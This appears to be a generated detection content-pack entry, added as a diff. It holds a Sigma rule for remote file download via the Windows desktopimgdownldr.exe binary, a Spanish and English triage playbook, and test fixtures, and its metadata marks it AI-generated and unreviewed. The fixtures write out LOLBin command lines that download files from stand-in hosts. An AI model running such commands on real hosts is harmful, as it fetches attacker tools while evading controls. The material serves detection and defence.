@@ -1,0 +1,131 @@
+{
+  "rule": {
+    "id": "214641c2-c579-4ecb-8427-0cf19df6842e",
+    "title": "Remote File Download Via Desktopimgdownldr Utility",
+    "level": "medium",
+    "status": "test",
+    "author": "Tim Rauch, Elastic (idea)",
+    "path": "windows/process_creation/proc_creation_win_desktopimgdownldr_remote_file_download.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_desktopimgdownldr_remote_file_download.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1105"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se detectó desktopimgdownldr.exe, un binario nativo de Windows para imágenes de pantalla de bloqueo, ejecutándose a sí mismo con /lockscreenurl apuntando a una URL HTTP(S). Puede indicar la descarga de un archivo remoto arbitrario, como alternativa a certutil.",
+      "what_it_detects": "Eventos de creación de procesos en los que Image y ParentImage terminan en \\desktopimgdownldr.exe y el CommandLine contiene '/lockscreenurl:http'. Es decir, el binario se relanza y descarga contenido desde una URL remota.",
+      "why_it_matters": "Es un binario firmado por Microsoft (LOLBin) que permite transferir herramientas desde un servidor externo (ATT&CK T1105, Ingress Tool Transfer) sin traer utilidades propias y evadiendo controles enfocados en certutil o PowerShell.",
+      "triage_steps": [
+        "Extraer la URL completa de /lockscreenurl en CommandLine; revisar el dominio o IP, la reputación, la extensión y si pertenece a un servicio corporativo de personalización.",
+        "Subir en el árbol de procesos: identificar qué proceso lanzó la primera instancia de desktopimgdownldr.exe (cmd, PowerShell, script, macro de Office) y su línea de comandos.",
+        "Validar el usuario y la integridad del proceso; un usuario estándar ejecutándolo de forma manual es muy inusual.",
+        "Buscar archivos nuevos en C:\\Windows\\Personalization\\LockScreenImage y cambios en la clave de registro PersonalizationCSP; obtener el hash del archivo descargado.",
+        "Revisar el tráfico de red y DNS del host hacia el dominio de la URL y comprobar si otros equipos lo contactaron.",
+        "Pivotear en el mismo host +/- 15 minutos: ejecución del archivo descargado, conexiones salientes nuevas, persistencia o alertas previas del mismo usuario."
+      ],
+      "false_positives": [
+        "La regla no documenta falsos positivos conocidos (Unknown).",
+        "Pruebas de administradores o configuraciones de imagen de pantalla de bloqueo distribuidas desde un servidor web interno legítimo.",
+        "Ejercicios de red team o validaciones de detección autorizadas."
+      ],
+      "response_steps": [
+        "Confirmar con el dueño del equipo o el área de TI si la descarga estaba autorizada; si no, escalar como incidente.",
+        "Aislar el endpoint mediante EDR si el archivo descargado es ejecutable, desconocido o ya se ejecutó.",
+        "Bloquear el dominio o la IP de la URL en el proxy y el firewall, y buscar el hash del archivo en toda la flota.",
+        "Tras preservar evidencia, eliminar el archivo descargado, revertir cambios en PersonalizationCSP y cualquier persistencia encontrada.",
+        "Restablecer las credenciales del usuario si hubo compromiso y considerar restringir desktopimgdownldr.exe con WDAC o AppLocker."
+      ],
+      "severity_rationale": "La severidad media es adecuada porque el uso legítimo manual es raro, pero la descarga por sí sola no confirma ejecución ni compromiso sin revisar el contenido."
+    },
+    "en": {
+      "summary": "desktopimgdownldr.exe, a native Windows lock screen image binary, relaunched itself with /lockscreenurl pointing to an HTTP(S) URL. This may be an arbitrary remote file download used instead of certutil.",
+      "what_it_detects": "Process creation events where both Image and ParentImage end with \\desktopimgdownldr.exe and CommandLine contains '/lockscreenurl:http', meaning the binary respawned itself to fetch content from a remote URL.",
+      "why_it_matters": "It is a Microsoft-signed LOLBin that lets attackers pull tools from external servers (ATT&CK T1105, Ingress Tool Transfer) without dropping their own downloaders, bypassing controls focused on certutil or PowerShell.",
+      "triage_steps": [
+        "Extract the full /lockscreenurl URL from CommandLine; check domain or IP reputation, file extension, and whether it is a known corporate personalization server.",
+        "Walk up the process tree: find what launched the first desktopimgdownldr.exe instance (cmd, PowerShell, script, Office macro) and its command line.",
+        "Check the user and process integrity level; a standard user running it by hand is highly unusual.",
+        "Look for new files in C:\\Windows\\Personalization\\LockScreenImage and changes to the PersonalizationCSP registry key; hash the downloaded file.",
+        "Review host network and DNS logs for the URL's domain and check whether other hosts contacted it.",
+        "Pivot on the same host +/- 15 minutes: execution of the downloaded file, new outbound connections, persistence, or earlier alerts for the same user."
+      ],
+      "false_positives": [
+        "The rule lists no known false positives (Unknown).",
+        "Admin testing or lock screen image deployment from a legitimate internal web server.",
+        "Authorized red team exercises or detection validation."
+      ],
+      "response_steps": [
+        "Confirm with the host owner or IT whether the download was authorized; if not, escalate as an incident.",
+        "Isolate the endpoint via EDR if the downloaded file is executable, unknown, or already ran.",
+        "Block the URL's domain or IP at proxy and firewall, and hunt for the file hash fleet-wide.",
+        "After preserving evidence, remove the downloaded file, revert PersonalizationCSP changes and any persistence found.",
+        "Reset user credentials if compromise is confirmed; consider restricting desktopimgdownldr.exe with WDAC or AppLocker."
+      ],
+      "severity_rationale": "Medium fits because legitimate manual use is rare, but a download alone does not prove execution or compromise until the content is reviewed."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "desktopimgdownldr.exe respawned by itself downloading a remote file via /lockscreenurl",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\desktopimgdownldr.exe",
+          "ParentImage": "C:\\Windows\\System32\\desktopimgdownldr.exe",
+          "CommandLine": "C:\\Windows\\System32\\desktopimgdownldr.exe /lockscreenurl:https://files.example.org/update.bin /eventName:desktopimgdownldr",
+          "ParentCommandLine": "desktopimgdownldr.exe /lockscreenurl:https://files.example.org/update.bin /eventName:desktopimgdownldr",
+          "IntegrityLevel": "High"
+        }
+      },
+      {
+        "description": "Plain HTTP URL to an IP address, child of itself",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Windows\\System32\\desktopimgdownldr.exe",
+          "ParentImage": "C:\\Windows\\System32\\desktopimgdownldr.exe",
+          "CommandLine": "desktopimgdownldr.exe /LockScreenUrl:http://203.0.113.45/img.png /eventName:desktopimgdownldr",
+          "IntegrityLevel": "High"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "First instance launched from cmd.exe; ParentImage is not desktopimgdownldr.exe so the selection does not match",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\desktopimgdownldr.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "desktopimgdownldr.exe /lockscreenurl:https://files.example.org/update.bin /eventName:desktopimgdownldr",
+          "IntegrityLevel": "High"
+        }
+      },
+      {
+        "description": "Self-spawned instance using a local file path instead of an HTTP URL",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0310.andes.example.com",
+          "User": "NT AUTHORITY\\SYSTEM",
+          "Image": "C:\\Windows\\System32\\desktopimgdownldr.exe",
+          "ParentImage": "C:\\Windows\\System32\\desktopimgdownldr.exe",
+          "CommandLine": "desktopimgdownldr.exe /lockscreenurl:C:\\Corp\\Branding\\lockscreen.jpg /eventName:desktopimgdownldr",
+          "IntegrityLevel": "System"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
